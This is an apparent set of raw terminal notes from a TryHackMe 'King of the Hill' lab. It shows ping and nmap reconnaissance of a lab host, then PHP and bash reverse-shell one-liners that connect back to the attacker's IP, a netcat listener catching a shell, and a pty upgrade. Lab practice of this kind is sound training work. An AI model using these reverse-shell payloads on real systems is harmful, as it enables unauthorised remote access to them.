┌──(kali㉿kali)-[~/thm/koth-easy]
└─$ ping 10.10.110.172
PING 10.10.110.172 (10.10.110.172) 56(84) bytes of data.
64 bytes from 10.10.110.172: icmp_seq=1 ttl=63 time=39.9 ms
64 bytes from 10.10.110.172: icmp_seq=2 ttl=63 time=39.5 ms
64 bytes from 10.10.110.172: icmp_seq=3 ttl=63 time=41.1 ms
64 bytes from 10.10.110.172: icmp_seq=4 ttl=63 time=39.4 ms
64 bytes from 10.10.110.172: icmp_seq=5 ttl=63 time=40.7 ms
64 bytes from 10.10.110.172: icmp_seq=6 ttl=63 time=40.9 ms
^C
--- 10.10.110.172 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5008ms
rtt min/avg/max/mdev = 39.438/40.244/41.076/0.658 ms

┌──(kali㉿kali)-[~/thm/koth-easy]
└─$ nmap -p- -sC -sV -Pn 10.10.110.172
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-24 17:09 CET
Nmap scan report for 10.10.110.172
Host is up (0.039s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:75:95:c7:6d:f4:92:a0:0e:1e:60:b8:be:4d:92:b1 (RSA)
|   256 a2:11:fb:e8:c5:c6:f8:98:b3:f8:d3:e3:91:56:b2:34 (ECDSA)
|_  256 72:19:b7:04:4c:df:18:be:6b:0f:9d:da:d5:14:68:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VeryBasicCMS - Home
| http-robots.txt: 1 disallowed entry 
|_/vbcms
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: My Website
|_Requested resource was /?page=home.php
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Learn PHP
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 24 Feb 2024 16:10:24 GMT
|     Content-Length: 10
|     Content-Type: text/plain; charset=utf-8
|     cyberus17
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=2/24%Time=65DA14EF%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,7F,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2024\x20Feb\x2
SF:02024\x2016:10:24\x20GMT\r\nContent-Length:\x2010\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\n\r\ncyberus17\n")%r(HTTPOptions,7F,"HTTP
SF:/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2024\x20Feb\x202024\x2016:10:24\x2
SF:0GMT\r\nContent-Length:\x2010\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\n\r\ncyberus17\n")%r(FourOhFourRequest,7F,"HTTP/1\.0\x20200\x
SF:20OK\r\nDate:\x20Sat,\x2024\x20Feb\x202024\x2016:10:24\x20GMT\r\nConten
SF:t-Length:\x2010\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\
SF:ncyberus17\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(LPDString,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(LDA
SF:PSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.89 seconds

dirb http://ip 
g

$sock=fsockopen("10.18.21.236",445);exec("sh <&3 >&3 2>&3");

└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.110.172] 58798

echo system(whoami);

serv3
serv3

exec("/bin/bash -c 'bash -i >&/dev/tcp/10.18.21.236/445 0>&1'");
exec(python3 -c 'import pty;pty.spawn("/bin/bash")');
